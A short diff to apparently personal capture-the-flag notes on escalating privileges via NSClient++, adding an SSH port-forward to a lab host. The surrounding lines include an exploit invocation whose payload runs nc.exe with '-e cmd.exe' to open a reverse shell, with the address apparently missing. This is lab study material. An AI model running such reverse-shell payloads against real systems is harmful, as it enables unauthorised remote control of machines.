@@ -48,6 +48,9 @@ nscp settings --activate-module CheckSystem --add-missing
 - Was supposed ot try to use http AND https when it comes to accessing the login panel 
 - Was supposed to view the NSClient+++ configuration file and determine what the allowed host was 
 - Was supposed to use port forwarding in order to log into Nadine information and view the information in the browser
+```
+ssh -L 8443:127.0.0.1:8443 Nadine@10.129.100.29
+```
 - Was supposed to use python exploit online, make edits and change it
 - Used the command privided in exploit.py 
 - Used the following command: uv run exploit.py "C:\temp\nc.exe 1001 -e cmd.exe" https://localhost:8443 'ew2x6SsGTxjRwXOT'
